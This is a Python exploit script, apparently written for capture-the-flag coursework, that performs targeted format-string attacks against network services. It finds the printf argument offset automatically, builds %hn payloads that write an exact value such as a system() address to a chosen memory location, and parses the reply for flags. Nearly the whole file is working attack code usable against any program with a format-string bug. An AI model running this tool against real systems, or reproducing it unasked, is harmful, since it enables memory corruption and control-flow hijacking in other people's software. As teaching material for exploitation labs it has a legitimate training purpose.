#!/usr/bin/env python3
"""Authorised coursework; localhost/classroom use; dummy flags.

Targeted format-string write: put an EXACT value at an EXACT address using two 2-byte
%hn writes. This is the one thing auto_pwn cannot do - its --goal fmt-write only probes
blindly. Verified against testbed/fmtwrite32.

  python3 fmtwrite.py HOST PORT --addr 0x804c034 --value 0xDEADBEEF
  python3 fmtwrite.py HOST PORT --addr-regex 'lives at (0x[0-9a-f]+)' --value 0xDEADBEEF
  python3 fmtwrite.py HOST PORT --addr 0x804c034 --value 0xDEADBEEF --offset 39 --dry-run

The argument offset (where YOUR buffer appears in printf's arg list) is found
automatically by sending AAAA%N$p until 0x41414141 comes back.
"""
import argparse, re, socket, struct, sys, time

sys.path.insert(0, __file__.rsplit("/", 1)[0])
try:
    from flags import decode_and_find
except Exception:
    decode_and_find = None


def talk(host, port, payload, timeout=4.0, idle=1.0, pre=(), want_banner=None, args=None):
    """One connection: read banner, optionally send `pre` lines (for services where the
    format-string bug is not the first input), then send the payload.

    `want_banner` is a callback given the banner; it returns the payload to send. That
    keeps address/value parsing in the SAME connection, which matters when the value is
    ASLR-randomised (e.g. system()) and differs on every connect."""
    s = socket.create_connection((host, port), timeout=timeout)
    out = b""
    try:
        s.settimeout(idle)
        try:
            out += s.recv(4096)
        except socket.timeout:
            pass
        banner = out
        for line in pre:
            s.sendall(line.encode("latin-1", "replace") + b"\n")
            time.sleep(0.25)
            try:
                out += s.recv(4096)
            except (socket.timeout, OSError):
                pass
        if want_banner is not None:
            payload = want_banner(banner)
            if payload is None:
                return banner, out
        s.sendall(payload + b"\n")
        time.sleep(0.4)
        # Many targets read again before the guard is checked (genie32 asks for a second
        # wish, and only then does main test the value). Without a follow-up line the
        # program blocks and we time out before the check runs.
        for extra in ((args.post if args and args.post else [""]) if args else []):
            try:
                s.sendall(extra.encode("latin-1", "replace") + b"\n")
            except OSError:
                break
            time.sleep(0.25)
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                out += d
            except (socket.timeout, OSError):
                break
    finally:
        s.close()
    return banner, out


def find_offset(host, port, limit=120, pre=(), batch=12):
    """Which printf argument slot is our own buffer?

    Probes several slots per connection ("AAAA%1$p|%2$p|...") and reads the position of
    0x41414141 out of the returned list, so a slot-12 offset costs one connection instead
    of twelve. That matters on a rate-limited service. Falls back to one slot per
    connection when the buffer is too small to hold a batched probe (genie32 reads 15
    bytes) or when the reply looks truncated."""
    n = 1
    while n <= limit:
        slots = list(range(n, min(n + batch, limit + 1)))
        probe = b"AAAA" + b"|".join(b"%%%d$p" % i for i in slots)
        _, out = talk(host, port, probe, idle=0.6, pre=pre)
        mark = out.rfind(b"AAAA")
        toks = re.findall(rb"0x[0-9a-fA-F]+|\(nil\)", out[mark + 4:] if mark >= 0 else out)
        if mark >= 0 and len(toks) >= len(slots):
            for i, tok in enumerate(toks[:len(slots)]):
                if tok.lower() == b"0x41414141":
                    return slots[i]
            n += batch
            continue
        # Truncated or unparsable: this target cannot take a batched probe.
        for one in slots:
            _, out = talk(host, port, b"AAAA%%%d$p" % one, idle=0.6, pre=pre)
            if b"AAAA0x41414141" in out:
                return one
        n += batch
    return None


BAD = (0x00, 0x0a)


def build_any(addr, offset, word=4):
    """Shortest possible write: no padding, just %n at the target.

    Writes whatever the character count happens to be. Useless if you need an EXACT
    value, perfect when the check is `if (guard != 0xdeadbeef)` - the guard only has to
    change. Also the only thing that fits when the input buffer is tiny (genie32 reads
    15 bytes; a padded two-half write needs 16)."""
    pack = struct.pack("<Q" if word == 8 else "<I", addr)
    return pack + b"%%%d$n" % offset, (0, 0, 0, 0)


def build(addr, value, offset, bits=32, half="both"):
    """head = the two target addresses; then pad-and-write each 2-byte half.

    %hn writes the number of characters printed SO FAR, so the counts are cumulative:
    the second pad is (high - low), not `high`. The addresses themselves already
    printed len(head) characters, which the first pad must subtract."""
    low, high = value & 0xFFFF, (value >> 16) & 0xFFFF
    if half == "low":
        # Only the low 2 bytes differ (target already holds something in the same 64KB),
        # so one write is enough - and it avoids addr+2, which often contains a bad byte.
        pack = struct.pack("<I", addr)
        p1 = low - len(pack)
        if p1 < 0:
            p1 += 0x10000
        return pack + (b"%%%dc%%%d$hn" % (p1, offset) if p1 else b"%%%d$hn" % offset), \
               (low, 0, p1, 0)
    if half == "high":
        pack = struct.pack("<I", addr + 2)
        p1 = high - len(pack)
        if p1 < 0:
            p1 += 0x10000
        return pack + (b"%%%dc%%%d$hn" % (p1, offset) if p1 else b"%%%d$hn" % offset), \
               (high, 0, p1, 0)
    pack = struct.pack("<I", addr) + struct.pack("<I", addr + 2)
    # A half smaller than what the addresses already printed (0x0000-0x0007) can only be
    # reached by wrapping the 16-bit count. Written FIRST that costs 64 KB before anything
    # else, and the other half another ~63 KB on top: ~129 KB of padding, slow enough that
    # the reply was missed - one run in ~16, whenever system() landed on xxxx0000. Counted
    # as value+0x10000 it sorts LAST, and the wrap is the short hop after the other half.
    eff = lambda v: v + 0x10000 if v < len(pack) else v
    low_first = eff(low) <= eff(high)
    first, second = (low, high) if low_first else (high, low)
    slot_first = offset if low_first else offset + 1
    slot_second = offset + 1 if low_first else offset
    p1 = eff(first) - len(pack)
    p2 = eff(second) - eff(first)
    out = pack
    out += b"%%%dc%%%d$hn" % (p1, slot_first) if p1 else b"%%%d$hn" % slot_first
    out += b"%%%dc%%%d$hn" % (p2, slot_second) if p2 else b"%%%d$hn" % slot_second
    return out, (first, second, p1, p2)


def main():
    ap = argparse.ArgumentParser(description="targeted %hn format-string write")
    ap.add_argument("host"); ap.add_argument("port", type=int)
    ap.add_argument("--addr", help="address to write to (hex)")
    ap.add_argument("--addr-regex", help="regex with one group capturing the address from the banner")
    ap.add_argument("--value", help="exact value to write, e.g. 0xDEADBEEF")
    ap.add_argument("--value-regex", help="regex capturing the value from the banner "
                                          "(for ASLR'd targets such as system())")
    ap.add_argument("--post", action="append", default=[], metavar="LINE",
                    help="line(s) to send AFTER the format string; default one blank line, "
                         "because many targets read again before checking the guard")
    ap.add_argument("--pre", action="append", default=[], metavar="LINE",
                    help="line(s) to send before the format string, when the bug is not "
                         "the first input; repeatable")
    ap.add_argument("--offset", type=int, help="printf arg slot of our buffer (default: auto)")
    ap.add_argument("--half", choices=["both", "low", "high"], default="both",
                    help="write only one 2-byte half; 'low' is enough when the target "
                         "already holds an address in the same 64KB, and it avoids addr+2")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if not args.value and not args.value_regex:
        sys.exit("[!] need --value (or --value any) or --value-regex")
    if not args.addr and not args.addr_regex:
        sys.exit("[!] need --addr or --addr-regex")

    offset = args.offset
    if offset is None:
        print("[*] finding the format-string argument offset ...")
        offset = find_offset(args.host, args.port, pre=args.pre)
        if offset is None:
            sys.exit("[!] could not locate our buffer in printf's arguments. Pass --offset.")
        print(f"[*] argument offset = {offset}")

    # Address and value are resolved from the banner of the SAME connection that sends
    # the write, so an ASLR'd value (system()) is the one actually in play.
    def make(banner):
        text = banner.decode("latin-1", "replace")
        if args.addr:
            addr = int(args.addr, 0)
        else:
            m = re.search(args.addr_regex, text)
            if not m:
                print(f"[!] --addr-regex did not match:\n{text[:200]}"); return None
            addr = int(m.group(1), 16)
        anyval = bool(args.value) and args.value.lower() == "any"
        if anyval:
            value = 0
        elif args.value:
            value = int(args.value, 0)
        else:
            m = re.search(args.value_regex, text)
            if not m:
                print(f"[!] --value-regex did not match:\n{text[:200]}"); return None
            value = int(m.group(1), 16)
        for b in (struct.pack("<I", addr) if anyval
                  else struct.pack("<I", addr) + struct.pack("<I", addr + 2)):
            if b in BAD and args.half == "both" and not anyval:
                print(f"[!] the target addresses contain byte {b:#04x}, which gets()/scanf "
                      f"truncate on. Try --half low (enough when only the low 16 bits differ).")
                break
        if anyval:
            payload, (f, s_, p1, p2) = build_any(addr, offset)
            print(f"[*] write ANY value to {hex(addr)} (bare %n, {len(payload)} bytes) - "
                  f"enough when the check only needs the guard to differ")
        else:
            payload, (f, s_, p1, p2) = build(addr, value, offset, half=args.half)
            print(f"[*] write {hex(value)} to {hex(addr)}: halves {hex(f)} then {hex(s_)}, "
                  f"pads %{p1}c then %{p2}c")
        print(f"[*] payload: {payload!r}")
        return None if args.dry_run else payload

    _, out = talk(args.host, args.port, b"", pre=args.pre, want_banner=make, args=args)
    if args.dry_run:
        return 0
    text = out.decode("latin-1", "replace")
    flag = None
    if decode_and_find:
        # Strict, like every other format-string path: the payload makes the service print
        # padding and whatever follows it, and a bare hex run in that (a session id, a
        # checksum) was reported as the flag. Flag-shaped text in the BANNER is furniture too.
        try:
            import flags as _fl
            _fl.learn_ignore(_ or b"")
        except Exception:                           # noqa: BLE001
            pass
        flag, _how = decode_and_find(text, strong_only=True)
    if flag:
        print(f"[+] FLAG: {flag}")
        return 0
    print("[*] response tail:")
    print(text[-400:])
    print("[!] no flag detected. Check the value actually landed (many services echo it back).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
